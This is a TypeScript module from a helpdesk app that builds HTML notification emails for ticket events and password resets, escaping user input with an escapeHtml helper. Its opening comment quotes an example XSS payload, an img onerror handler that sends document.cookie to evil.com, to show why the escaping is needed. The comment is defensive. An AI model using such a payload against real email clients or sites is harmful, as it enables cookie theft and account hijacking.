/**
 * escapeHtml — sanitise every user-controlled string before embedding it in an
 * HTML email body.  Without this, a ticket title like
 *   <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
 * would be rendered by the recipient's email client and execute the payload.
 *
 * This is the same helper used in automationEngine.ts and sla-check/route.ts.
 * It lives here too so email.ts has zero external dependencies for sanitisation.
 */
function escapeHtml(str: string): string {
    return String(str)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#x27;");
}

async function sendEmail(to: string, subject: string, html: string) {
    const apiKey = process.env.BREVO_API_KEY;
    const fromEmail = process.env.SMTP_FROM || process.env.SMTP_USER;

  if (!apiKey) {
        console.log(`[EMAIL - BREVO_API_KEY NOT SET] To: ${to} | Subject: ${subject}`);
        return;
  }

  try {
        const res = await fetch("https://api.brevo.com/v3/smtp/email", {
                method: "POST",
                headers: {
                          "accept": "application/json",
                          "api-key": apiKey,
                          "content-type": "application/json",
                },
                body: JSON.stringify({
                          sender: { name: "Helpdesk", email: fromEmail },
                          to: [{ email: to }],
                          subject,
                          htmlContent: html,
                }),
        });

      if (!res.ok) {
              const err = await res.text();
              console.error(`[EMAIL ERROR] To: ${to} | Status: ${res.status} | ${err}`);
      } else {
              const data = await res.json();
              console.log(`[EMAIL SENT] To: ${to} | Subject: ${subject} | ID: ${data.messageId}`);
      }
  } catch (err) {
        console.error(`[EMAIL ERROR] To: ${to} | Subject: ${subject}`, err);
  }
}

// --- TICKET CREATED → notify relevant department staff ---

export async function sendTicketCreatedEmail(
    staffEmail: string,
    ticketTitle: string,
    ticketType: string,
    ticketId: string,
    creatorName: string,
    priority: string
  ) {
    const appUrl = process.env.NEXTAUTH_URL;
    if (!appUrl) return;
    const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
    const priorityColor = priority === "urgent" ? "#dc2626" : priority === "high" ? "#d97706" : "#3b82f6";
    const deptLabel = ticketType === "IT" ? "IT Support" : ticketType === "Software" ? "AI / Software Team" : "HR Support";
    const accentColor = ticketType === "Software" ? "#7c3aed" : "#0f172a";

  // FIX H1: all user-controlled values escaped before HTML embedding
  const safeTitle = escapeHtml(ticketTitle);
    const safeCreator = escapeHtml(creatorName);
    const safePriority = escapeHtml(priority);
    const safeDept = escapeHtml(deptLabel);

  const html = `
  <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
    <div style="background:${accentColor};border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
        <span style="color:white;font-size:22px;font-weight:900;letter-spacing:-0.5px;">Karma Staff Helpdesk</span>
          </div>
            <div style="background:white;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid ${priorityColor};">
                <p style="margin:0 0 8px;font-size:16px;font-weight:700;color:#0f172a;">${safeTitle}</p>
                    <div style="display:flex;gap:16px;flex-wrap:wrap;">
                          <span style="font-size:12px;font-weight:700;color:#64748b;">Type: <span style="color:#0f172a;">${safeDept}</span></span>
                                <span style="font-size:12px;font-weight:700;color:#64748b;">Priority: <span style="color:${priorityColor};">${safePriority}</span></span>
                                      <span style="font-size:12px;font-weight:700;color:#64748b;">From: <span style="color:#0f172a;">${safeCreator}</span></span>
                                          </div>
                                            </div>
                                              <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:700;">
                                                  View &amp; Respond to Ticket →
                                                    </a>
                                                      <p style="margin:24px 0 0;font-size:12px;color:#94a3b8;">
                                                          You received this because you are a member of the ${safeDept} team.
                                                            </p>
                                                            </div>
                                                              `;

  await sendEmail(staffEmail, `[${safePriority.toUpperCase()}] New ${safeDept} Ticket: ${safeTitle}`, html);
}

// --- TICKET RESOLVED → notify the employee who raised it ---

export async function sendTicketResolvedEmail(
    employeeEmail: string,
    ticketTitle: string,
    ticketId: string,
    resolverName: string
  ) {
    const appUrl = process.env.NEXTAUTH_URL;
    if (!appUrl) return;
    const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;

  const safeTitle = escapeHtml(ticketTitle);
    const safeResolver = escapeHtml(resolverName);

  const html = `
  <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
    <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
        <span style="color:white;font-size:22px;font-weight:900;">Karma Staff Helpdesk</span>
          </div>
            <div style="background:white;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid #16a34a;">
                <p style="margin:0 0 8px;font-size:16px;font-weight:700;color:#16a34a;">✓ Ticket Resolved</p>
                    <p style="margin:0;font-size:14px;color:#0f172a;">${safeTitle}</p>
                        <p style="margin:8px 0 0;font-size:12px;color:#64748b;">Resolved by: ${safeResolver}</p>
                          </div>
                            <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:700;">
                                View Ticket →
                                  </a>
                                    <p style="margin:24px 0 0;font-size:12px;color:#94a3b8;">
                                        If you need further assistance, please open a new ticket.
                                          </p>
                                          </div>
                                            `;

  await sendEmail(employeeEmail, `Resolved: ${safeTitle}`, html);
}

// --- NEW COMMENT → notify ticket owner or staff ---

export async function sendTicketCommentEmail(
    recipientEmail: string,
    ticketTitle: string,
    ticketId: string,
    commenterName: string,
    commentPreview: string
  ) {
    const appUrl = process.env.NEXTAUTH_URL;
    if (!appUrl) return;
    const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;

  const safeTitle = escapeHtml(ticketTitle);
    const safeCommenter = escapeHtml(commenterName);
    const safePreview = escapeHtml(commentPreview.slice(0, 200));

  const html = `
  <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
    <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
        <span style="color:white;font-size:22px;font-weight:900;">Karma Staff Helpdesk</span>
          </div>
            <div style="background:white;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid #3b82f6;">
                <p style="margin:0 0 8px;font-size:14px;font-weight:700;color:#0f172a;">${safeCommenter} commented on:</p>
                    <p style="margin:0 0 12px;font-size:16px;font-weight:700;color:#0f172a;">${safeTitle}</p>
                        <p style="margin:0;font-size:13px;color:#475569;font-style:italic;">"${safePreview}…"</p>
                          </div>
                            <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:700;">
                                View Comment →
                                  </a>
                                  </div>
                                    `;

  await sendEmail(recipientEmail, `New comment on: ${safeTitle}`, html);
}

// --- TICKET IN PROGRESS → notify employee ---

export async function sendTicketInProgressEmail(
    employeeEmail: string,
    ticketTitle: string,
    ticketId: string,
    staffName: string
  ) {
    const appUrl = process.env.NEXTAUTH_URL;
    if (!appUrl) return;
    const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;

  const safeTitle = escapeHtml(ticketTitle);
    const safeStaff = escapeHtml(staffName);

  const html = `
  <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
    <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
        <span style="color:white;font-size:22px;font-weight:900;">Karma Staff Helpdesk</span>
          </div>
            <div style="background:white;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid #d97706;">
                <p style="margin:0 0 8px;font-size:16px;font-weight:700;color:#d97706;">⚙ In Progress</p>
                    <p style="margin:0;font-size:14px;color:#0f172a;">${safeTitle}</p>
                        <p style="margin:8px 0 0;font-size:12px;color:#64748b;">Being handled by: ${safeStaff}</p>
                          </div>
                            <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:700;">
                                View Ticket →
                                  </a>
                                  </div>
                                    `;

  await sendEmail(employeeEmail, `Your ticket is being worked on: ${safeTitle}`, html);
}

// --- TICKET ASSIGNED → notify assignee ---

export async function sendTicketAssignedEmail(
    assigneeEmail: string,
    ticketTitle: string,
    ticketId: string,
    ticketType: string,
    priority: string
  ) {
    const appUrl = process.env.NEXTAUTH_URL;
    if (!appUrl) return;
    const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
    const priorityColor = priority === "urgent" ? "#dc2626" : priority === "high" ? "#d97706" : "#3b82f6";

  const safeTitle = escapeHtml(ticketTitle);
    const safeType = escapeHtml(ticketType);
    const safePriority = escapeHtml(priority);

  const html = `
  <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
    <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
        <span style="color:white;font-size:22px;font-weight:900;">Karma Staff Helpdesk</span>
          </div>
            <div style="background:white;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid ${priorityColor};">
                <p style="margin:0 0 8px;font-size:16px;font-weight:700;color:#0f172a;">Ticket Assigned to You</p>
                    <p style="margin:0 0 8px;font-size:14px;color:#0f172a;">${safeTitle}</p>
                        <span style="font-size:12px;font-weight:700;color:#64748b;">Type: ${safeType} | Priority: <span style="color:${priorityColor};">${safePriority}</span></span>
                          </div>
                            <a href="${ticketUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:700;">
                                View Ticket →
                                  </a>
                                  </div>
                                    `;

  await sendEmail(assigneeEmail, `Assigned: ${safeTitle}`, html);
}

// --- TICKET ESCALATED → notify admins ---

export async function sendTicketEscalatedEmail(
    adminEmail: string,
    ticketTitle: string,
    ticketId: string,
    newPriority: string
  ) {
    const appUrl = process.env.NEXTAUTH_URL;
    if (!appUrl) return;
    const ticketUrl = `${appUrl}/dashboard/ticket/${ticketId}`;
    const priorityColor = newPriority === "urgent" ? "#dc2626" : "#d97706";

  const safeTitle = escapeHtml(ticketTitle);
    const safePriority = escapeHtml(newPriority);

  const html = `
  <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
    <div style="background:#dc2626;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
        <span style="color:white;font-size:22px;font-weight:900;">⚠ Ticket Escalated</span>
          </div>
            <div style="background:white;border-radius:8px;padding:20px;margin-bottom:24px;border-left:4px solid ${priorityColor};">
                <p style="margin:0 0 8px;font-size:16px;font-weight:700;color:#0f172a;">${safeTitle}</p>
                    <p style="margin:0;font-size:13px;color:#64748b;">New priority: <strong style="color:${priorityColor};">${safePriority.toUpperCase()}</strong></p>
                      </div>
                        <a href="${ticketUrl}" style="display:inline-block;background:#dc2626;color:white;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:700;">
                            Review Ticket →
                              </a>
                              </div>
                                `;

  await sendEmail(adminEmail, `ESCALATED [${safePriority.toUpperCase()}]: ${safeTitle}`, html);
}

// --- PASSWORD RESET ---

export async function sendPasswordResetEmail(email: string, token: string) {
    const appUrl = process.env.NEXTAUTH_URL;
    if (!appUrl) return;
    const resetUrl = `${appUrl}/reset-password?token=${encodeURIComponent(token)}`;
    // email and token are system-generated — no user HTML injection risk here,
  // but we escape email defensively in case it contains special characters.
  const safeEmail = escapeHtml(email);

  const html = `
  <div style="font-family:sans-serif;max-width:560px;margin:0 auto;background:#f8fafc;padding:32px 16px;">
    <div style="background:#0f172a;border-radius:12px;padding:24px 32px;margin-bottom:24px;text-align:center;">
        <span style="color:white;font-size:22px;font-weight:900;">Karma Staff Helpdesk</span>
          </div>
            <div style="background:white;border-radius:8px;padding:20px;margin-bottom:24px;">
                <p style="margin:0 0 12px;font-size:16px;font-weight:700;color:#0f172a;">Password Reset Request</p>
                    <p style="margin:0;font-size:14px;color:#475569;">
                          A password reset was requested for <strong>${safeEmail}</strong>.
                                This link expires in 1 hour.
                                    </p>
                                      </div>
                                        <a href="${resetUrl}" style="display:inline-block;background:#0f172a;color:white;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:700;">
                                            Reset Password →
                                              </a>
                                                <p style="margin:24px 0 0;font-size:12px;color:#94a3b8;">
                                                    If you did not request this, you can safely ignore this email.
                                                      </p>
                                                      </div>
                                                        `;

  await sendEmail(email, "Reset your Helpdesk password", html);
}
